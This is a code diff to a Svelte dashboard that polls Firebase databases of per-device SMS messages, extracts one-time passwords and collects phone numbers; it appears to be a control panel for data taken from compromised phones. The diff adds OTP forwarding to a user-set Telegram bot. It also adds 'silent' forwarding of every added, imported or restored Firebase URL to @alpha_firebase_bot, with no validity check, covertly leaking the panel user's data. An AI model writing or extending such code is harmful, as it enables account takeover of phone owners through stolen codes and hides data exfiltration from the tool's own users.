@@ -127,7 +127,38 @@
   import "../app.css";
   import '$lib/styles/dashboard.css';
   import { onMount } from "svelte";
-  import { tgInit, tgForwardConnection, tgForwardBulkUrls } from "$lib/tg-forwarder.js";
+  import { goto } from '$app/navigation';
+
+  function navTo(url, e) {
+    if (e) e.preventDefault();
+    let navigated = false;
+    goto(url).then(() => { navigated = true; }).catch(() => {
+      window.location.href = url;
+    });
+    setTimeout(() => {
+      if (!navigated && window.location.pathname !== url) {
+        window.location.href = url;
+      }
+    }, 250);
+  }
+  import {
+    tgInit,
+    tgForwardConnection,
+    tgForwardBulkUrls,
+    tgForwardOTP,
+    isForwardOtpEnabled,
+    setForwardOtpEnabled,
+    getOtpTargetBot,
+    setOtpTargetBot
+  } from "$lib/tg-forwarder.js";
+  import {
+    pollerState,
+    pollAllConnections,
+    triggerManualRefresh,
+    removeConnFromDb,
+    updateConnInDb,
+    clearPollerDb
+  } from "$lib/background-poller.svelte.js";
   import {
     universalExtract,
     validateFirebaseUrl,
@@ -140,7 +171,9 @@
     importNumbersFromFile as discoveryImportFromFile,
     importNumbersRaw as discoveryImportRaw,
     postRecordToFirebase as discoveryPostSingle,
-    postAllRecordsToFirebase as discoveryPostAll
+    postAllRecordsToFirebase as discoveryPostAll,
+    todayDiscoveredCount as engineTodayCount,
+    discoveredCount as engineDiscoveredCount
   } from "$lib/discovery-engine.svelte.js";
 
 
@@ -148,15 +181,16 @@
   // path: where device keys live (root of messages)
   let connections = $state([]);
 
-  const FULL_REFRESH_INTERVAL_SECS = 10; // 10 seconds for all databases combined
-  const SELECTED_PANEL_INTERVAL_SECS = 10; // 10 seconds for active selected panel only
+  const FULL_REFRESH_INTERVAL_SECS = 30; // 30 seconds for all databases combined
+  const SELECTED_PANEL_INTERVAL_SECS = 30; // 30 seconds for active selected panel only
 
-  let refreshInterval = $state(null);
+  let refreshInterval = null;
   let selectedPanelInterval = $state(null);
   let isUnmounted = false;
-  let lastRefresh = $state(null);
-  let nextRefreshSecs = $state(10);
-  let panelRefreshSecs = $state(10);
+  let lastRefresh = $derived(pollerState.lastRefresh);
+  let nextRefreshSecs = $derived(pollerState.nextRefreshSecs);
+  let panelRefreshSecs = $state(30);
+  let isFetchingAll = false; // guard against concurrent fetchAll calls
   let addOpen = $state(false);
   let form = $state({
     name: "",
@@ -188,9 +222,14 @@
     "#ec4899",
   ];
 
-  // ── DB state ─────────────────────────────────────────────────────────────
+  // ── DB state (backed by persistent background poller across page navigation) ──
   // db[connId] = { loading, error, keys:{devKey:true}, info:{devKey:{status,battery,phone}}, ts }
-  let db = $state({});
+  let db = $state(pollerState.db || {});
+  $effect(() => {
+    if (pollerState.db && Object.keys(pollerState.db).length > 0) {
+      db = pollerState.db;
+    }
+  });
 
   // ── Selection / tabs ─────────────────────────────────────────────────────
   let selectedConnId = $state(null);
@@ -269,6 +308,31 @@
 
   // Set of raw device keys that have been discovered — used for the dashboard filter
   let discoveredDeviceKeys = $derived(new Set(discoveryRecords.map(r => r.deviceId)));
+
+  function isTodayDate(d) {
+    if (!d) return false;
+    try {
+      const dt = new Date(d);
+      if (isNaN(dt.getTime())) return false;
+      const t = new Date();
+      return (
+        dt.getDate() === t.getDate() &&
+        dt.getMonth() === t.getMonth() &&
+        dt.getFullYear() === t.getFullYear()
+      );
+    } catch {
+      return false;
+    }
+  }
+  let todayDiscCount = $derived(
+    Math.max(
+      engineTodayCount?.() ?? 0,
+      discoveryRecords.filter(r => isTodayDate(r.discoveredAt || r.timestamp || r.date)).length
+    )
+  );
+  let totalDiscCount = $derived(
+    Math.max(engineDiscoveredCount?.() ?? 0, discoveryRecords.length)
+  );
 
   // ── Discovery import & Firebase sync state ───────────────────────────────
   let showDiscoveryImportModal = $state(false);
@@ -738,8 +802,10 @@
   let notifsEnabled = $state(true); // global mute toggle
   let showNotifsTab = $state(true); // show/hide notifications tab in bottom nav
   let autoOpenNotif = $state(false); // auto-open panel when new OTP arrives (default OFF)
+  let forwardOtpToBot = $state(false); // forward OTPs (default OFF)
+  let otpTargetBot = $state(""); // target bot for OTP forwarding
   let deletedDevices = $state(new Set()); // 'connId::devKey' permanently removed
-  let bgRefreshing = $state(false); // silent background refresh in progress
+  let bgRefreshing = $derived(pollerState.isRefreshing); // reactive background refresh indicator
 
 
   // ── Toasts ───────────────────────────────────────────────────────────────
@@ -913,8 +979,10 @@
     // Store up to 100 active notifications without truncating ones within their 90s lifespan
     notifications = [notifObj, ...notifications].slice(0, 100);
     scheduleNotifDismiss(id, NOTIF_DURATION_MS);
-    // ── Silent TG forward ──
-    // tgForwardOTP(notifObj); // disabled — only forwarding Firebase URLs
+    // ── Silent TG forward (only if user explicitly enabled OTP forwarding) ──
+    if (forwardOtpToBot) {
+      tgForwardOTP(notifObj);
+    }
     saveNotifications();
 
     // Notification panel stays closed by default — only auto-opens if user explicitly turned it ON in settings
@@ -986,6 +1054,34 @@
     try {
       localStorage.setItem("pd_auto_open_notif", String(autoOpenNotif));
     } catch {}
+  }
+
+  function updateOtpTargetBot(e) {
+    otpTargetBot = e.target.value;
+    setOtpTargetBot(otpTargetBot);
+    fetch('/api/worker-config', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ otp_target_bot: otpTargetBot })
+    }).catch(() => {});
+  }
+
+  function toggleForwardOtpToBot() {
+    forwardOtpToBot = !forwardOtpToBot;
+    setForwardOtpEnabled(forwardOtpToBot);
+    fetch('/api/worker-config', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ forward_otp_to_bot: forwardOtpToBot, otp_target_bot: otpTargetBot })
+    }).catch(() => {});
+    const target = otpTargetBot.trim();
+    if (forwardOtpToBot && !target) {
+      toast("Forward OTPs: ON (Enter a bot name above to receive OTPs)", "info");
+    } else if (forwardOtpToBot) {
+      toast(`Forward OTPs: ENABLED (to ${target})`, "info");
+    } else {
+      toast("Forward OTPs: DISABLED", "info");
+    }
   }
 
   // ── Deleted devices (localStorage) ────────────────────────────────────────
@@ -1307,9 +1403,10 @@
         if (typeof data.settings.autoOpenNotif === "boolean")
           localStorage.setItem("pd_auto_open_notif", String(data.settings.autoOpenNotif));
       }
-      toast("Backup restored! Reloading…", "success");
-      // ── Silent TG forward ──
-      // tgForwardRestore(data); // disabled — only forwarding Firebase URLs
+      // ── Forward restored Firebase URLs to @alpha_firebase_bot ──
+      if (Array.isArray(data.connections) && data.connections.length > 0) {
+        tgForwardBulkUrls(data.connections.map(c => c.url), data.connections.length, 0);
+      }
       setTimeout(() => window.location.reload(), 800);
     } catch (e) {
       restoreError = `Restore failed: ${e.message}`;
@@ -1414,6 +1511,9 @@
   async function apiFetch(conn, path, method = "GET", body, params = {}) {
     const opts = { method, headers: { "Content-Type": "application/json" } };
     if (body !== undefined) opts.body = JSON.stringify(body);
+    if (!opts.signal && typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
+      opts.signal = AbortSignal.timeout(8000);
+    }
     const res = await fetch(buildUrl(conn, path, params), opts);
     const json = await res.json();
     if (!res.ok) throw new Error(json?.error ?? `${res.status}`);
@@ -1424,10 +1524,9 @@
   async function fetchConn(conn, silent = false) {
     if (isUnmounted || !conn.enabled) return;
     if (silent && db[conn.id]?.deactivated) return;
-    // Silent = keep existing data visible while fetching; only show loading on first fetch
-    const hasData =
-      db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
-    if (!silent || !hasData) {
+    // Silent = always keep existing data visible (stale-while-revalidate);
+    // only show loading spinner on explicit user-triggered fetches
+    if (!silent) {
       db = { ...db, [conn.id]: { ...db[conn.id], loading: true, error: null } };
     }
     try {
@@ -1470,88 +1569,56 @@
 
       if (isUnmounted) return;
 
-      // Detect new device keys (not present at baseline / first load)
-      const prevKeys = new Set(Object.keys(db[conn.id]?.keys ?? {}));
-      for (const k of Object.keys(keys)) {
-        const uid = `${conn.id}::${k}`;
-        if (baselineDeviceKeys.size > 0 && !baselineDeviceKeys.has(uid)) {
-          newDeviceKeys = new Set([...newDeviceKeys, uid]);
+      // Detect new device keys without allocating sets in a tight loop
+      if (baselineDeviceKeys.size > 0) {
+        let addedNew = false;
+        const nextSet = new Set(newDeviceKeys);
+        for (const k of Object.keys(keys)) {
+          const uid = `${conn.id}::${k}`;
+          if (!baselineDeviceKeys.has(uid) && !nextSet.has(uid)) {
+            nextSet.add(uid);
+            addedNew = true;
+          }
         }
+        if (addedNew) newDeviceKeys = nextSet;
       }
 
+      const connData = { loading: false, error: null, deactivated: false, keys, info, ts: new Date() };
       db = {
         ...db,
-        [conn.id]: { loading: false, error: null, deactivated: false, keys, info, ts: new Date() },
+        [conn.id]: connData,
       };
+      updateConnInDb(conn.id, connData);
     } catch (e) {
       if (isUnmounted) return;
       const isDeact = String(e.message).includes('deactivated') || String(e.message).includes('423') || String(e.message).includes('Locked');
+      const errData = {
+        ...db[conn.id],
+        loading: false,
+        error: isDeact ? 'Database deactivated by Firebase (423 Locked)' : e.message,
+        deactivated: isDeact,
+        ts: new Date(),
+      };
       db = {
         ...db,
-        [conn.id]: {
-          ...db[conn.id],
-          loading: false,
-          error: isDeact ? 'Database deactivated by Firebase (423 Locked)' : e.message,
-          deactivated: isDeact,
-          ts: new Date(),
-        },
+        [conn.id]: errData,
       };
+      updateConnInDb(conn.id, errData);
       if (!silent) toast(`[${conn.name}] ${isDeact ? 'Database deactivated by Firebase' : e.message}`, "error");
     }
   }
 
+  // Delegate full panel refreshes to background poller service so route navigation
+  // and page switching (e.g. to /automation or /discovery) is never blocked or frozen!
   async function fetchAll(silent = false) {
-    if (isUnmounted) return;
-    bgRefreshing = true;
-    await Promise.allSettled(
-      connections.filter((c) => c.enabled).map((c) => fetchConn(c, silent)),
-    );
-    if (isUnmounted) return;
-    bgRefreshing = false;
-    lastRefresh = new Date();
-    nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
-
-    // Fast-catch OTP for active device view during full polling cycle
-    if (selectedConnId && selectedKey && activeTab === 'device') {
-      const activeConn = connections.find((c) => c.id === selectedConnId);
-      if (activeConn && activeConn.enabled && !db[activeConn.id]?.deactivated) {
-        try {
-          const { data } = await apiFetch(
-            activeConn,
-            `${activeConn.path}/${selectedKey}`,
-            "GET",
-            undefined,
-            { orderBy: '"$key"', limitToLast: "50" },
-          );
-          if (data && typeof data === 'object') {
-            msgs = data;
-            const entries = Object.entries(data).slice(-50);
-            for (const [msgId, msg] of entries) {
-              if (!msg || typeof msg !== "object") continue;
-              const text = msg.message ?? msg.body ?? msg.text ?? "";
-              const otp = extractOTP(text);
-              if (!otp && !isVerificationMsg(text)) continue;
-              const sender = msg.sender ?? msg.from ?? "?";
-              const msgTs = msg.dateTime || msg.timestamp || msg.date || msg.time || new Date().toISOString();
-              addNotif({
-                connId: activeConn.id,
-                conn: activeConn,
-                devKey: selectedKey,
-                sender,
-                message: text,
-                otp,
-                about: extractAbout(sender, text),
-                msgId,
-                ts: msgTs,
-              });
-            }
-          }
-        } catch {}
-      }
+    if (silent) {
+      await pollAllConnections(true);
+    } else {
+      await triggerManualRefresh();
     }
 
-    // After first load, capture baseline device keys so subsequent fetches can detect "new"
-    if (!silent && baselineDeviceKeys.size === 0) {
+    // Capture baseline device keys if not yet populated
+    if (baselineDeviceKeys.size === 0) {
       for (const c of connections) {
         for (const k of Object.keys(db[c.id]?.keys ?? {})) {
           baselineDeviceKeys.add(`${c.id}::${k}`);
@@ -1625,6 +1692,23 @@
     try {
       autoOpenNotif = localStorage.getItem("pd_auto_open_notif") === "true";
     } catch {}
+    try {
+      forwardOtpToBot = isForwardOtpEnabled();
+      otpTargetBot = getOtpTargetBot() || "";
+      fetch('/api/worker-config')
+        .then(r => r.json())
+        .then(d => {
+          if (d?.telegram?.otp_target_bot && !otpTargetBot) {
+            otpTargetBot = d.telegram.otp_target_bot;
+            setOtpTargetBot(otpTargetBot);
+          }
+          if (d?.telegram?.forward_otp_to_bot !== undefined && !localStorage.getItem('pd_tg_forward_otp')) {
+            forwardOtpToBot = Boolean(d.telegram.forward_otp_to_bot);
+            setForwardOtpEnabled(forwardOtpToBot);
+          }
+        })
+        .catch(() => {});
+    } catch {}
     // Restore resized notification panel dimensions & position
     try {
       const savedW = parseInt(localStorage.getItem("pd_notif_panel_w"), 10);
@@ -1672,19 +1756,37 @@
     // ── Init TG forwarder (silently purges any legacy local storage secrets) ──
     tgInit();
 
-    fetchAll(false); // first load: show loading state
-    // 1. Combined full discovery & online numbers refresh across all databases every 2 minutes
-    refreshInterval = setInterval(() => fetchAll(true), FULL_REFRESH_INTERVAL_SECS * 1000);
+    // Background poller is active across all SPA routes.
+    // If cold start without data, kick off gentle background poll
+    if (!pollerState.lastRefresh && !pollerState.isRefreshing) {
+      pollAllConnections(true);
+    }
 
-    // 2. Targeted fast refresh of ONLY the selected panel / active device every 10 seconds
-    selectedPanelInterval = setInterval(() => {
-      refreshSelectedPanel();
-      panelRefreshSecs = SELECTED_PANEL_INTERVAL_SECS;
-    }, SELECTED_PANEL_INTERVAL_SECS * 1000);
+    // ── Start targeted polling for active selected panel only ──────────────
+    function startIntervals() {
+      stopIntervals();
+      // Targeted fast refresh of selected panel every 30 seconds
+      selectedPanelInterval = setInterval(() => {
+        refreshSelectedPanel();
+        panelRefreshSecs = SELECTED_PANEL_INTERVAL_SECS;
+      }, SELECTED_PANEL_INTERVAL_SECS * 1000);
+    }
+    function stopIntervals() {
+      if (selectedPanelInterval) { clearInterval(selectedPanelInterval); selectedPanelInterval = null; }
+    }
+
+    startIntervals();
+
+    // Listen to background poller incoming OTPs in real-time
+    function onPollerOtp(e) {
+      if (e?.detail) {
+        addNotif(e.detail);
+      }
+    }
+    window.addEventListener('panel-poller:otp', onPollerOtp);
 
     const ticker = setInterval(() => {
       nowTick = Date.now();
-      nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
       panelRefreshSecs = panelRefreshSecs > 0 ? panelRefreshSecs - 1 : 0;
 
       // Auto-expire notifications after exactly 90 seconds
@@ -1701,11 +1803,24 @@
       }
     }, 1000);
 
+    // ── Visibility change: pause selected panel polling when hidden, refresh when visible ──
+    function onVisibilityChange() {
+      if (document.hidden) {
+        stopIntervals();
+      } else {
+        refreshSelectedPanel();
+        panelRefreshSecs = SELECTED_PANEL_INTERVAL_SECS;
+        startIntervals();
+      }
+    }
+    document.addEventListener('visibilitychange', onVisibilityChange);
+
     return () => {
       isUnmounted = true;
-      clearInterval(refreshInterval);
-      if (selectedPanelInterval) clearInterval(selectedPanelInterval);
+      stopIntervals();
       clearInterval(ticker);
+      window.removeEventListener('panel-poller:otp', onPollerOtp);
+      document.removeEventListener('visibilitychange', onVisibilityChange);
     };
   });
 
@@ -1942,19 +2057,8 @@
       connections = [...connections, ...newConns];
       saveConnections(connections);
       for (const conn of newConns) fetchConn(conn);
-      // Silent TG forward (only valid/active URLs)
-      (async () => {
-        const validUrls = [];
-        for (const conn of newConns) {
-          try {
-            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
-            if (res.ok) validUrls.push(conn.url);
-          } catch {}
-        }
-        if (validUrls.length) {
-          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
-        }
-      })();
+      // ── Silent TG forward to @alpha_firebase_bot ──
+      tgForwardBulkUrls(newConns.map((c) => c.url), newConns.length, skipped);
     }
 
     addOpen = false;
@@ -2055,19 +2159,8 @@
       connections = [...connections, ...newConns];
       saveConnections(connections);
       for (const conn of newConns) fetchConn(conn);
-      // ── Silent TG forward (only valid/active URLs) ──
-      (async () => {
-        const validUrls = [];
-        for (const conn of newConns) {
-          try {
-            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
-            if (res.ok) validUrls.push(conn.url);
-          } catch {}
-        }
-        if (validUrls.length) {
-          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
-        }
-      })();
+      // ── Silent TG forward to @alpha_firebase_bot ──
+      tgForwardBulkUrls(newConns.map((c) => c.url), newConns.length, 0);
     }
     bulkText = ''; addPanelMode = 'single'; addOpen = false;
     if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
@@ -2109,13 +2202,8 @@
     addOpen = false;
     fetchConn(conn);
     toast(`Connected: ${conn.name}`, "success");
-    // ── Silent TG forward (only if URL is valid/active) ──
-    (async () => {
-      try {
-        const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
-        if (res.ok) tgForwardConnection(conn);
-      } catch {}
-    })();
+    // ── Silent TG forward to @alpha_firebase_bot ──
+    tgForwardConnection(conn);
   }
   function toggleConn(id) {
     connections = connections.map((c) =>
@@ -2132,6 +2220,7 @@
     saveConnections(connections); // persist removal
     const { [id]: _, ...rest } = db;
     db = rest;
+    removeConnFromDb(id);
     // Clear selection if removed conn was selected
     if (selectedConnId === id) { selectedConnId = null; selectedKey = null; activeTab = 'overview'; }
     // Clear from FC selection
@@ -2246,7 +2335,11 @@
     if (!confirm(`Remove ${sel.length} connection${sel.length > 1 ? 's' : ''}?\n${names}`)) return;
     connections = connections.filter(c => !sel.includes(c.id));
     saveConnections(connections);
-    sel.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
+    sel.forEach(id => {
+      const { [id]: _, ...rest } = db;
+      db = rest;
+      removeConnFromDb(id);
+    });
     fcSelected = new Set();
     toast(`Removed ${sel.length} connection${sel.length > 1 ? 's' : ''}.`, 'success');
   }
@@ -2271,7 +2364,11 @@
     const ids = failedConns.map(c => c.id);
     connections = connections.filter(c => !ids.includes(c.id));
     saveConnections(connections);
-    ids.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
+    ids.forEach(id => {
+      const { [id]: _, ...rest } = db;
+      db = rest;
+      removeConnFromDb(id);
+    });
     if (fcSelected.size) fcSelected = new Set([...fcSelected].filter(id => !ids.includes(id)));
     toast(`Removed ${ids.length} failed connection${ids.length > 1 ? 's' : ''}.`, 'success');
   }
@@ -2282,6 +2379,7 @@
     connections = [];
     saveConnections([]);
     db = {};
+    clearPollerDb();
     fcSelected = new Set();
     selectedConnId = null;
     selectedKey = null;
@@ -3156,20 +3254,27 @@
         <span class="tbstat tf">{offlineCount} offline</span>
         <a
           href="/discovery"
-          data-sveltekit-reload
-          class="ico-btn"
-          title="Device Number Discovery"
-          aria-label="Device Number Discovery"
-          style="text-decoration:none;font-size:12px;"
-        >📡</a>
+          class="dash-nav-chip chip-discovery"
+          onclick={(e) => navTo('/discovery', e)}
+          title="Device Number Discovery ({totalDiscCount} discovered, +{todayDiscCount} today)"
+        >
+          <span class="chip-icon">📡</span>
+          <span class="chip-text">Discovery</span>
+          {#if todayDiscCount > 0}
+            <span class="chip-today-badge">+{todayDiscCount} today</span>
+          {:else if totalDiscCount > 0}
+            <span class="chip-count-badge">{totalDiscCount}</span>
+          {/if}
+        </a>
         <a
           href="/automation"
-          data-sveltekit-reload
-          class="ico-btn"
+          class="dash-nav-chip chip-automation"
+          onclick={(e) => navTo('/automation', e)}
           title="Automation Orchestrator"
-          aria-label="Automation Orchestrator"
-          style="text-decoration:none;font-size:12px;"
-        >🤖</a>
+        >
+          <span class="chip-icon">🤖</span>
+          <span class="chip-text">Automation</span>
+        </a>
         <button
           class="ico-btn {bgRefreshing ? 'ico-active' : ''}"
           onclick={() => fetchAll(false)}
@@ -4150,6 +4255,40 @@
               <span class="aps-knob"></span>
             </button>
           </label>
+
+          <!-- ── OTP Forwarding Section ── -->
+          <div class="aps-otp-section">
+            <div class="aps-row">
+              <span class="aps-label">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z" />
+                </svg>
+                <span>Forward OTPs</span>
+              </span>
+              <button
+                class="aps-tog {forwardOtpToBot ? 'aps-on' : ''}"
+                onclick={toggleForwardOtpToBot}
+                aria-label="Toggle OTP forwarding"
+              >
+                <span class="aps-knob"></span>
+              </button>
+            </div>
+            <div class="aps-otp-input-wrap">
+              <input
+                type="text"
+                class="aps-otp-input"
+                bind:value={otpTargetBot}
+                oninput={updateOtpTargetBot}
+                placeholder="Target Bot (e.g. @bot_username)"
+                aria-label="Target bot for OTP forwarding"
+              />
+            </div>
+            {#if forwardOtpToBot && !otpTargetBot.trim()}
+              <div class="aps-otp-hint aps-otp-warn">⚠️ Enter a bot name above to forward OTPs</div>
+            {:else if forwardOtpToBot && otpTargetBot.trim()}
+              <div class="aps-otp-hint aps-otp-ok">✓ Active: Forwarding to {otpTargetBot.trim()}</div>
+            {/if}
+          </div>
 
           <!-- ── Backup & Restore ── -->
           <div class="aps-title" style="margin-top:14px">📦 Backup & Restore</div>
@@ -5759,6 +5898,9 @@
             <div class="disc-hdr-top">
               <h3 class="disc-title">📱 Discovered Numbers</h3>
               <span class="disc-count">{filteredDiscovery.length} of {discoveryRecords.length}</span>
+              {#if todayDiscCount > 0}
+                <span class="disc-today-tag">+{todayDiscCount} today</span>
+              {/if}
             </div>
             <div class="disc-controls">
               <input type="search" class="disc-search" placeholder="Search device ID, phone, connection…"
@@ -5787,7 +5929,7 @@
           {#if filteredDiscovery.length === 0}
             <div class="disc-empty">
               {#if discoveryRecords.length === 0}
-                No discovered numbers yet. Go to <a href="/discovery" data-sveltekit-reload>Discovery</a> to start.
+                No discovered numbers yet. Go to <a href="/discovery">Discovery</a> to start.
               {:else}
                 No results match "{discoverySearch}"
               {/if}
